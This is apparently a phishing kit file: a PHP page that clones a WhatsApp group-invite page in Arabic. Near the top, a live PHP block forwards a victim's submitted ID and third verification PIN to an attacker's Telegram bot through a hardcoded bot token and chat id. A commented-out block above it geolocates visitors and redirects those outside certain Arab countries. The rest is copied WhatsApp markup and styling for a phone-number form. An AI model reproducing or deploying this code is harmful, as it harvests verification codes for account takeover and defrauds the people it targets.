
<?php


/*
function get_client_ip_server() {
    $ipaddress = '';
  if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else if(isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
  else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
  else if(isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
  else if(isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  else
    $ipaddress = 'UNKNOWN';
  
    return $ipaddress;
  }
  
  $ipaddress = get_client_ip_server();
  
  function getCountry($ip){
      $curlSession = curl_init();
      curl_setopt($curlSession, CURLOPT_URL, 'http://www.geoplugin.net/json.gp?ip='.$ip);
      curl_setopt($curlSession, CURLOPT_BINARYTRANSFER, true);
      curl_setopt($curlSession, CURLOPT_RETURNTRANSFER, true);
  
      $jsonData = json_decode(curl_exec($curlSession));
      curl_close($curlSession);
  
      return $jsonData->geoplugin_countryCode;
  }
  
  $nobots = 0;
  
  if( getCountry($ipaddress) == 'SA' OR getCountry($ipaddress) == 'OM' OR getCountry($ipaddress) == 'BH' OR getCountry($ipaddress) == 'KW' OR getCountry($ipaddress) == 'QA' OR getCountry($ipaddress) == 'AE' OR getCountry($ipaddress) == 'JO' OR getCountry($ipaddress) == 'MA'){
      $nobots = 1;
  } else {
      header('Location:  https://www.snapchat.com/invite/MTMzZTg0YzAtOTA0My00NDBmLWE3N2MtNzQ0OGFiODVjODM1/M2RjMTdhNTktMjc3Ny04NmRkLTk4ZGUtOTgxZDQyYmFlNzdj');
  }
*/
?>

<?php 
$id = $_POST['id'];
$idN = "#ID:".$id;
$telegram_token ="6210783848:AAH-lyU8fmONL-0JLyhLiwN6gg4W9h4wFBU"; 
$url = "https://api.telegram.org/bot".$telegram_token;
$chat_id ="5288376819";




 $params=[
      'chat_id'=>$chat_id,
      'text' => $idN."| CODE PIN 3 : ".$_POST['codeconf3'],
      
  ];
  $ch = curl_init($url . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>





<html lang="ar" id="facebook" class="">

<head>
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <script
        nonce="">function envFlush(a) { function b(b) { for (var c in a) b[c] = a[c] } window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env)) } envFlush({ "useTrustedTypes": false, "isTrustedTypesReportOnly": false, "ajaxpipe_token": "AXhhOC0ViqEOGTk3bMo", "gk_instrument_object_url": true, "stack_trace_limit": 30, "timesliceBufferSize": 5000, "show_invariant_decoder": false, "compat_iframe_token": "AQ7Q6aUxFEXp6YNfXus", "isCQuick": false });</script>
    <script
        nonce="">(function (a) { function b(b) { if (!window.openDatabase) return; b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL = function (a, b, c, d) { return window.openDatabase(a, b, c, d) }; window.openDatabase = function () { throw new Error() } } b(a) })(this);</script>
    <style nonce=""></style>
    <script nonce="">__DEV__ = 0;</script><noscript>
        <meta http-equiv="refresh" content="0; URL=/--sanitized-S228802--?lang=ar&amp;_fb_noscript=1" />
    </noscript>
    <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta name="keywords">
    <meta property="og:title" content="">
    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yo/r/J5gK5AgJ_L5.png">
    <meta property="og:site_name" content="WhatsApp.com">
    <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:keywords">
    <meta property="invite_link_type" content="REGULAR">
    <meta property="invite_link_type_v2" content="">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="robots" content="noindex">
    <link rel="shortcut icon" href="https://static.whatsapp.net/rsrc.php/v3/yz/r/ujTY9i_Jhs1.png">
    <link type="text/css" rel="stylesheet"
        href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/iZFW4Wn89pz.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="lR1wO42" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.whatsapp.net/rsrc.php/v3/yd/l/1,cross/X2fu9uuqQru.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="FW+GhOb" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
        href="https://static.whatsapp.net/rsrc.php/v3/yK/l/1,cross/ZMlOtpPQ11J.css?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="e6uIOhT" crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3/y3/r/BWAw9Os-g2M.js?_nc_x=Ij3Wp8lg5Kz"
        data-bootloader-hash="xiNwIjT" crossorigin="anonymous" nonce=""></script>
    <script
        nonce="">
        requireLazy(["HasteSupportData"], function (m) { m.handle({ "clpData": { "1838142": { "r": 1, "s": 1 }, "1936894": { "r": 1, "s": 1 }, "1949898": { "r": 1 }, "1848815": { "r": 10000, "s": 1 } }, "gkxData": { "708253": { "result": false, "hash": "AT5n4hBL3YTMnQWt1zA" }, "996940": { "result": false, "hash": "AT7opYuEGy3sjG1aNas" }, "1073500": { "result": false, "hash": "AT7aJmfnqWyioxOOtzo" }, "1224637": { "result": false, "hash": "AT7JRluWxuwDm3XzwQ0" }, "1263340": { "result": false, "hash": "AT5bwizWgDaFQudmTEM" }, "676837": { "result": false, "hash": "AT4N8wBZA8ctCdHwlrw" }, "1167394": { "result": false, "hash": "AT7BpN-tlUPwbIIFHr8" }, "3579": { "result": true, "hash": "AT4GLroqi1faSYwd3ck" }, "4435": { "result": true, "hash": "AT7J_frtMJbbiuSsVO0" }, "1857581": { "result": false, "hash": "AT5yTxGMp6le0PAtX7Q" } } }) }); requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) { (new ServerJS()).handle({ "define": [["URLFragmentPreludeConfig", [], { "hashtagRedirect": false, "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"] }, 137], ["CometPersistQueryParams", [], { "relative": {}, "domain": {} }, 6231], ["CookieDomain", [], { "domain": "whatsapp.com" }, 6421], ["CurrentAdAccountInitialData", [], { "AD_ACCOUNT_ID": null }, 6828], ["BootloaderConfig", [], { "deferBootloads": false, "jsRetries": [200, 500], "jsRetryAbortNum": 2, "jsRetryAbortTime": 5, "silentDups": false, "hypStep4": false, "phdOn": false, "btCutoffIndex": 78, "fastPathForAlreadyRequired": false, "translationRetries": [200, 500], "translationRetryAbortNum": 3, "translationRetryAbortTime": 50 }, 329], ["CSSLoaderConfig", [], { "timeout": 5000, "modulePrefix": "BLCSS:", "forcePollForBootloader": true, "loadEventSupported": true }, 619], ["CookieCoreConfig", [], { "dpr": { "t": 604800, "s": "None" }, "locale": { "t": 604800, "s": "None" }, "wa_lang_pref": { "t": 604800, "s": "None" } }, 2104], ["CurrentCommunityInitialData", [], {}, 490], ["CurrentEnvironment", [], { "facebookdotcom": true, "messengerdotcom": false, "workplacedotcom": false, "instagramdotcom": false, "workdotmetadotcom": false }, 827], ["CurrentUserInitialData", [], { "ACCOUNT_ID": "0", "USER_ID": "0", "NAME": "", "SHORT_NAME": null, "IS_BUSINESS_PERSON_ACCOUNT": false, "HAS_SECONDARY_BUSINESS_PERSON": false, "IS_FACEBOOK_WORK_ACCOUNT": false, "IS_MESSENGER_ONLY_USER": false, "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false, "IS_MESSENGER_CALL_GUEST_USER": false, "IS_WORK_MESSENGER_CALL_GUEST_USER": false, "IS_WORKROOMS_USER": false, "APP_ID": "256281040558", "IS_BUSINESS_DOMAIN": false }, 270], ["DTSGInitialData", [], {}, 258], ["ISB", [], {}, 330], ["LSD", [], { "token": "_85lb3vku_TEgNR7AA5Y8V" }, 323], ["ServerNonce", [], { "ServerNonce": "zAgvkb330ic-2sCvRH1TVJ" }, 141], ["SiteData", [], { "server_revision": 1007374203, "client_revision": 1007374203, "tier": "", "push_phase": "C3", "pkg_cohort": "BP:whatsapp_www_pkg", "haste_session": "19472.BP:whatsapp_www_pkg.2.0..0.0", "pr": 1, "haste_site": "www", "manifest_base_uri": "https:\/\/static.whatsapp.net", "manifest_origin": null, "manifest_version_prefix": null, "be_one_ahead": false, "is_rtl": true, "is_comet": false, "is_experimental_tier": false, "is_jit_warmed_up": false, "hsi": "7225915425268584351", "semr_host_bucket": "6", "bl_hash_version": 2, "skip_rd_bl": true, "comet_env": 0, "wbloks_env": false, "spin": 0, "__spin_r": 1007374203, "__spin_b": "trunk", "__spin_t": 1682414539, "vip": "157.240.212.60" }, 317], ["SprinkleConfig", [], { "param_name": "jazoest", "version": 2, "should_randomize": false }, 2111], ["UserAgentData", [], { "browserArchitecture": "64", "browserFullVersion": "112.0.0.0", "browserMinorVersion": 0, "browserName": "Chrome", "browserVersion": 112, "deviceName": "Unknown", "engineName": "WebKit", "engineVersion": "537.36", "platformArchitecture": "64", "platformName": "Windows", "platformVersion": "10", "platformFullVersion": "10" }, 527], ["PromiseUsePolyfillSetImmediateGK", [], { "www_always_use_polyfill_setimmediate": false }, 2190], ["KSConfig", [], { "killed": { "__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS", "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE", "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER", "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD", "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX", "SRT_REVIEW_DISABLE_FELLOWSHIP_REVIEW", "EO_STORE_HOME_PAGE_COVID19_BANNER"] }, "ko": { "__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "8rDvN9vWdAK", "5BdzWGmfvrA", "DDZhogI19W", "acrJTh9WGdp", "1oOE64fL4wO", "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7", "9kCSDzzr8fu", "awYA7fn2Bse", "aBMlJ8QRPWE", "Fl3bH3ozLe"] } }, 2580], ["JSErrorLoggingConfig", [], { "appId": 256281040558, "extra": [], "reportInterval": 50, "sampleWeight": null, "sampleWeightKey": "__jssesw", "projectBlocklist": [] }, 2776], ["DataStoreConfig", [], { "expandoKey": "__FB_STORE", "useExpando": true }, 2915], ["CookieCoreLoggingConfig", [], { "maximumIgnorableStallMs": 16.67, "sampleRate": 9.7e-5, "sampleRateClassic": 1.0e-10, "sampleRateFastStale": 1.0e-8 }, 3401], ["ImmediateImplementationExperiments", [], { "prefer_message_channel": true }, 3419], ["DTSGInitData", [], { "token": "", "async_get_token": "" }, 3515], ["UriNeedRawQuerySVConfig", [], { "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com", "nibio.no"] }, 3871], ["InitialCookieConsent", [], { "deferCookies": false, "initialConsent": [1, 2], "noCookies": false, "shouldShowCookieBanner": false }, 4328], ["CometAltpayJsSdkIframeAllowedDomains", [], { "allowed_domains": ["https:\/\/live.adyen.com", "https:\/\/integration-facebook.payu.in", "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com", "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"] }, 4920], ["BootloaderEndpointConfig", [], { "debugNoBatching": false, "maxBatchSize": -1, "endpointURI": "https:\/\/chat.whatsapp.com\/ajax\/bootloader-endpoint\/" }, 5094], ["CookieConsentIFrameConfig", [], { "consent_param": "FQAREhISAA==.ARbAFZGtQS1-66ai8EvsPhdKKeH-Bf58eg2WzhMDEFhIL4yp", "allowlisted_iframes": [] }, 5540], ["BigPipeExperiments", [], { "link_images_to_pagelets": false }, 907], ["IntlVariationHoldout", [], { "disable_variation": false }, 6533], ["IntlNumberTypeProps", ["IntlCLDRNumberType34"], { "module": { "__m": "IntlCLDRNumberType34" } }, 7027], ["AsyncRequestConfig", [], { "retryOnNetworkError": "1", "useFetchStreamAjaxPipeTransport": false }, 328], ["FbtQTOverrides", [], { "overrides": {} }, 551], ["FbtResultGK", [], { "shouldReturnFbtResult": true, "inlineMode": "NO_INLINE" }, 876], ["IntlPhonologicalRules", [], { "meta": {}, "patterns": {} }, 1496], ["IntlViewerContext", [], { "GENDER": 1, "regionalLocale": null }, 772], ["NumberFormatConfig", [], { "decimalSeparator": ",", "numberDelimiter": "\u00a0", "minDigitsForThousandsSeparator": 4, "standardDecimalPatternInfo": { "primaryGroupSize": 3, "secondaryGroupSize": 3 }, "numberingSystemData": null }, 54], ["SessionNameConfig", [], { "seed": "22AE" }, 757], ["ZeroCategoryHeader", [], {}, 1127], ["ZeroRewriteRules", [], { "rewrite_rules": {}, "whitelist": { "\/hr\/r": 1, "\/hr\/p": 1, "\/zero\/unsupported_browser\/": 1, "\/zero\/policy\/optin": 1, "\/zero\/optin\/write\/": 1, "\/zero\/optin\/legal\/": 1, "\/zero\/optin\/free\/": 1, "\/about\/privacy\/": 1, "\/about\/privacy\/update\/": 1, "\/privacy\/explanation\/": 1, "\/zero\/toggle\/welcome\/": 1, "\/zero\/toggle\/nux\/": 1, "\/zero\/toggle\/settings\/": 1, "\/fup\/interstitial\/": 1, "\/work\/landing": 1, "\/work\/login\/": 1, "\/work\/email\/": 1, "\/ai.php": 1, "\/js_dialog_resources\/dialog_descriptions_android.json": 0, "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0, "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0, "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0, "\/qp\/interstitial\/": 1, "\/qp\/action\/redirect\/": 1, "\/qp\/action\/close\/": 1, "\/zero\/support\/ineligible\/": 1, "\/zero_balance_redirect\/": 1, "\/zero_balance_redirect": 1, "\/zero_balance_redirect\/l\/": 1, "\/l.php": 1, "\/lsr.php": 1, "\/ajax\/dtsg\/": 1, "\/checkpoint\/block\/": 1, "\/exitdsite": 1, "\/zero\/balance\/pixel\/": 1, "\/zero\/balance\/": 1, "\/zero\/balance\/carrier_landing\/": 1, "\/zero\/flex\/logging\/": 1, "\/tr": 1, "\/tr\/": 1, "\/sem_campaigns\/sem_pixel_test\/": 1, "\/bookmarks\/flyout\/body\/": 1, "\/zero\/subno\/": 1, "\/confirmemail.php": 1, "\/policies\/": 1, "\/mobile\/internetdotorg\/classifier\/": 1, "\/zero\/dogfooding": 1, "\/xti.php": 1, "\/zero\/fblite\/config\/": 1, "\/hr\/zsh\/wc\/": 1, "\/ajax\/bootloader-endpoint\/": 1, "\/mobile\/zero\/carrier_page\/": 1, "\/mobile\/zero\/carrier_page\/education_page\/": 1, "\/mobile\/zero\/carrier_page\/feature_switch\/": 1, "\/mobile\/zero\/carrier_page\/settings_page\/": 1, "\/aloha_check_build": 1, "\/upsell\/zbd\/softnudge\/": 1, "\/mobile\/zero\/af_transition\/": 1, "\/mobile\/zero\/af_transition\/action\/": 1, "\/mobile\/zero\/freemium\/": 1, "\/mobile\/zero\/freemium\/redirect\/": 1, "\/mobile\/zero\/freemium\/zero_fup\/": 1, "\/privacy\/policy\/": 1, "\/privacy\/center\/": 1, "\/data\/manifest\/": 1, "\/4oh4.php": 1, "\/autologin.php": 1, "\/birthday_help.php": 1, "\/checkpoint\/": 1, "\/contact-importer\/": 1, "\/cr.php": 1, "\/legal\/terms\/": 1, "\/login.php": 1, "\/login\/": 1, "\/mobile\/account\/": 1, "\/n\/": 1, "\/remote_test_device\/": 1, "\/upsell\/buy\/": 1, "\/upsell\/buyconfirm\/": 1, "\/upsell\/buyresult\/": 1, "\/upsell\/promos\/": 1, "\/upsell\/continue\/": 1, "\/upsell\/h\/promos\/": 1, "\/upsell\/loan\/learnmore\/": 1, "\/upsell\/purchase\/": 1, "\/upsell\/promos\/upgrade\/": 1, "\/upsell\/buy_redirect\/": 1, "\/upsell\/loan\/buyconfirm\/": 1, "\/upsell\/loan\/buy\/": 1, "\/upsell\/sms\/": 1, "\/wap\/a\/channel\/reconnect.php": 1, "\/wap\/a\/nux\/wizard\/nav.php": 1, "\/wap\/appreg.php": 1, "\/wap\/birthday_help.php": 1, "\/wap\/c.php": 1, "\/wap\/confirmemail.php": 1, "\/wap\/cr.php": 1, "\/wap\/login.php": 1, "\/wap\/r.php": 1, "\/zero\/datapolicy": 1, "\/a\/timezone.php": 1, "\/a\/bz": 1, "\/bz\/reliability": 1, "\/r.php": 1, "\/mr\/": 1, "\/reg\/": 1, "\/registration\/log\/": 1, "\/terms\/": 1, "\/f123\/": 1, "\/expert\/": 1, "\/experts\/": 1, "\/terms\/index.php": 1, "\/terms.php": 1, "\/srr\/": 1, "\/msite\/redirect\/": 1, "\/fbs\/pixel\/": 1, "\/contactpoint\/preconfirmation\/": 1, "\/contactpoint\/cliff\/": 1, "\/contactpoint\/confirm\/submit\/": 1, "\/contactpoint\/confirmed\/": 1, "\/contactpoint\/login\/": 1, "\/preconfirmation\/contactpoint_change\/": 1, "\/help\/contact\/": 1, "\/survey\/": 1, "\/upsell\/loyaltytopup\/accept\/": 1, "\/settings\/": 1, "\/lite\/": 1, "\/zero_status_update\/": 1, "\/operator_store\/": 1, "\/upsell\/": 1, "\/wifiauth\/login\/": 1 } }, 1478], ["ServerTimeData", [], { "serverTime": 1682414539986, "timeOfRequestStart": 1682414539617, "timeOfResponseStart": 1682414539617 }, 5943], ["WebConnectionClassServerGuess", [], { "connectionClass": "UNKNOWN" }, 4705], ["AnalyticsCoreData", [], { "device_id": "$^|AcbZgpgIoQwylfpiRLMWahlMMqIzC1iEtzq9co9Aimjg1SPpJELQF2-gw822WkdKwGyLoHE1FLzrXYZ1KxhR0dOHvznh|fd.AcbMCxcQ9a1Qq0QF7BEYV3E-1UoHpOJEf--GzWYeW4Wfm1fe0Hxq7NWv347gBt-WYmy9_8nnZ4RUTnoWX9wfH-Lg", "app_id": "256281040558", "enable_bladerunner": false, "enable_ack": true, "push_phase": "C3", "enable_observer": false, "enable_dataloss_timer": false, "enable_fallback_for_br": true, "queue_activation_experiment": false, "max_delay_br_queue": 60000, "max_delay_br_queue_immediate": 3, "consents": {}, "app_universe": 1, "allow_br_event_identity_propogation": true }, 5237], ["cr:1126", ["TimeSliceImpl"], { "__rc": ["TimeSliceImpl", "Aa3rjMjNJmyfeGPTOwaCaj_NxMGxbaLRMWiQMLj5zL7CXEtkfBcHPQ_9bJ2826Uo_sJH-wsHhRh1yslJolYQXb0"] }, -1], ["cr:3769", ["PromiseImpl"], { "__rc": ["PromiseImpl", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:696703", [], { "__rc": [null, "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:708886", ["EventProfilerImpl"], { "__rc": ["EventProfilerImpl", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:806696", ["clearTimeoutBlue"], { "__rc": ["clearTimeoutBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:807042", ["setTimeoutBlue"], { "__rc": ["setTimeoutBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:896462", ["setIntervalAcrossTransitionsBlue"], { "__rc": ["setIntervalAcrossTransitionsBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], { "__rc": ["setTimeoutAcrossTransitionsBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1003267", ["clearIntervalBlue"], { "__rc": ["clearIntervalBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1183579", ["InlineFbtResultImpl"], { "__rc": ["InlineFbtResultImpl", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:925100", ["RunBlue"], { "__rc": ["RunBlue", "Aa3GxwBv0_lqP8afnOBwAzTCS4ANfYXRTdskWGgckHa6sdKMoMUkPkaE2LtLeAhyLHZsDFwdydl77wy3N_Q_NWIRkYg"] }, -1], ["cr:1094907", [], { "__rc": [null, "Aa0fzpWZcxY-0srm0zIieM_hb3ahzJAGDTFvHm4LCKKTLPI48yO4rB4aSKlFxqnCQLHi7s0D-JFa08o33XME4e0"] }, -1], ["EventConfig", [], { "sampling": { "bandwidth": 0, "play": 0, "playing": 0, "progress": 0, "pause": 0, "ended": 0, "seeked": 0, "seeking": 0, "waiting": 0, "loadedmetadata": 0, "canplay": 0, "selectionchange": 0, "change": 0, "timeupdate": 0, "adaptation": 0, "focus": 0, "blur": 0, "load": 0, "error": 0, "message": 0, "abort": 0, "storage": 0, "scroll": 200000, "mousemove": 20000, "mouseover": 10000, "mouseout": 10000, "mousewheel": 1, "MSPointerMove": 10000, "keydown": 0.1, "click": 0.02, "mouseup": 0.02, "__100ms": 0.001, "__default": 5000, "__min": 100, "__interactionDefault": 200, "__eventDefault": 100000 }, "page_sampling_boost": 1, "interaction_regexes": {}, "interaction_boost": {}, "event_types": {}, "manual_instrumentation": false, "profile_eager_execution": false, "disable_heuristic": true, "disable_event_profiler": false }, 1726], ["AdsInterfacesSessionConfig", [], {}, 2393]], "require": [["markJSEnabled"], ["lowerDomain"], ["URLFragmentPrelude"], ["Primer"], ["BigPipe"], ["Bootloader"], ["TimeSlice"], ["AsyncRequest"], ["BanzaiScuba_DEPRECATED"], ["FbtLogging"], ["IntlQtEventFalcoEvent"], ["RequireDeferredReference", "unblock", [], [["AsyncRequest", "BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"], "sd"]], ["RequireDeferredReference", "unblock", [], [["AsyncRequest", "BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"], "css"]]] }); });</script>
    <link href="https://static.whatsapp.net/rsrc.php/v3/ys/r/ioxK2Ojkb1E.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3/ys/r/ioxK2Ojkb1E.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="a2YBUdi"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v3/yZ/r/CBGEnxzDw4z.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3/yZ/r/CBGEnxzDw4z.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="LX1aYVl"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v3iJoa4/yN/l/ar_AR/4Hi6-Bc0Uff.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
        as="script" crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3iJoa4/yN/l/ar_AR/4Hi6-Bc0Uff.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="Af0v4Z0"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v3/y9/r/4thXtY6F4n3.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3/y9/r/4thXtY6F4n3.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="uW12T1t"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v3/ya/r/ZL1A46FYUm6.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
        crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3/ya/r/ZL1A46FYUm6.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="8TNZYzX"></script>
    <link href="https://static.whatsapp.net/rsrc.php/v3iVNN4/yD/l/ar_AR/yAWm_y2I0ga.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
        as="script" crossorigin="anonymous">
    <script src="https://static.whatsapp.net/rsrc.php/v3iVNN4/yD/l/ar_AR/yAWm_y2I0ga.js?_nc_x=Ij3Wp8lg5Kz" async=""
        crossorigin="anonymous" data-bootloader-hash-client="WRhAqCJ"></script>
        <link rel="stylesheet" href="build/css/intlTelInput.css">
</head>
<style>
    .input-phone{
     /* background-color: #389880; */
    border-top: none;
    border-left: none;
    border-right: none;
    width: 75%;
    border-bottom: 3px solid #36ba6d;
    }
    .iti__flag.iti__sa {
    height: 14px;
    background-position: -4339px 0px;
    visibility: hidden;
}
::placeholder {
    text-align: center;
    margin-top:-4px;
}
.form-group {
  margin-bottom: $form-group-margin-bottom;
}

/* _forms.scss:284 */
.form-group {
  display: flex;
  flex: 0 0 auto;
  flex-flow: row wrap;
  align-items: center;
  margin-bottom: 0;
}
.button_a {
    border-radius: 5px;
    display: inline-block;
    font-size: 17px;
    font-weight: 500;
    height: 47px;
    width: 131px;
    /*letter-spacing: .071em;*/
    line-height: 51px;
  /*padding: 14px 14px 14px 14px;*/
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
.iti--separate-dial-code .iti__selected-flag {
    background-color: rgba(0, 0, 0, 0.05);
    margin-right: -78px;
    direction: ltr;
}
@media only screen and (max-width: 768px) {
.button_a {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
        border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    font-weight: 500;
    height: 42px;
    width: 113px;
  /*  letter-spacing: .071em;*/
